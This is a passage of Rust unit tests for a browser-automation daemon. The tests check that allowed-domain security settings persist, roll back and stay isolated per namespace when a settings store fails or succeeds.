    async fn test_a_failed_launch_that_is_not_a_rejection_keeps_the_new_stored_value() {
        let (_env, _) = isolated_state();
        let store = FlakyStore::counting();
        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
        let cmd = json!({
            "action": "launch",
            "executablePath": "/nonexistent/chrome",
            "allowedDomains": ["example.com"]
        });

        assert!(handle_launch(&cmd, &mut state).await.is_err());

        let stored = store.load().unwrap().unwrap();
        assert_eq!(
            stored.allowed_domains,
            Some(vec!["example.com".to_string()])
        );
    }

    #[tokio::test]
    async fn test_a_rejection_reports_a_stored_value_that_could_not_be_restored() {
        let (_env, _) = isolated_state();
        let store = FlakyStore::new(2);
        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
        apply_settings_patch(&mut state, &patch_with(vec![domains(&["a.com"])]), true)
            .await
            .unwrap();
        let cmd = json!({
            "action": "launch",
            "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
            "allowedDomains": ["b.com"]
        });

        let err = handle_launch(&cmd, &mut state).await.unwrap_err();

        // Save 0 (a.com) and save 1 (b.com) succeed; the restore (save 2) fails.
        assert!(
            err.contains("the stored security settings could not be restored")
                && err.contains("disk full"),
            "{err}"
        );
        assert_eq!(store.saves(), 3, "the restore was attempted");
        assert_eq!(current_allowed_domains(&state).await, vec!["a.com"]);
    }

    #[tokio::test]
    async fn test_an_empty_list_clears_the_filter_and_the_clear_persists() {
        let (_env, _) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(dir.path(), "s"));
        let mut first = boot_state(store.clone(), "s");
        apply_settings_patch(
            &mut first,
            &patch_with(vec![domains(&["example.com"])]),
            true,
        )
        .await
        .unwrap();

        apply_settings_patch(&mut first, &patch_with(vec![domains(&[])]), true)
            .await
            .unwrap();
        assert!(first.domain_filter.read().await.is_none());
        drop(first);

        let second = boot_state(store, "s");
        assert!(current_allowed_domains(&second).await.is_empty());
        assert_eq!(second.settings.security().allowed_domains, Some(Vec::new()));
    }

    #[tokio::test]
    async fn test_a_failing_store_leaves_the_session_untouched() {
        let (_env, _) = isolated_state();
        let store = FlakyStore::new(0);
        let mut state = DaemonState::with_store(Running::defaults(), store.clone());
        let before = state.settings.clone();

        let err = apply_settings_patch(&mut state, &security_patch("/p.json"), true)
            .await
            .err()
            .expect("the write fails");

        assert!(err.contains("disk full"), "{err}");
        assert!(state.domain_filter.read().await.is_none());
        assert!(state.policy.is_none());
        assert!(state.confirm_actions.is_none());
        assert_eq!(state.settings, before);
        assert_eq!(store.load().unwrap(), None);
    }

    #[tokio::test]
    async fn test_a_failing_store_fails_the_command_before_it_runs() {
        let (_env, _) = isolated_state();
        let mut state = DaemonState::with_store(Running::defaults(), FlakyStore::new(0));
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "settings": { "allowed-domains": ["example.com"] }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false, "{resp}");
        assert!(
            resp["error"].as_str().unwrap().contains("disk full"),
            "{resp}"
        );
        assert!(state.domain_filter.read().await.is_none());
    }

    #[tokio::test]
    async fn test_stores_in_other_namespaces_do_not_leak_settings() {
        let (_env, _) = isolated_state();
        let one = tempfile::tempdir().unwrap();
        let other = tempfile::tempdir().unwrap();
        let store: Arc<dyn Store> = Arc::new(FsStore::new(one.path(), "s"));
        let mut state = boot_state(store, "s");
        apply_settings_patch(
            &mut state,
            &patch_with(vec![domains(&["example.com"])]),
            true,
        )
        .await
        .unwrap();

        let elsewhere = boot_state(Arc::new(FsStore::new(other.path(), "s")), "s");
        let sibling = boot_state(Arc::new(FsStore::new(one.path(), "t")), "t");

        assert!(elsewhere.domain_filter.read().await.is_none());
        assert!(sibling.domain_filter.read().await.is_none());
    }
}
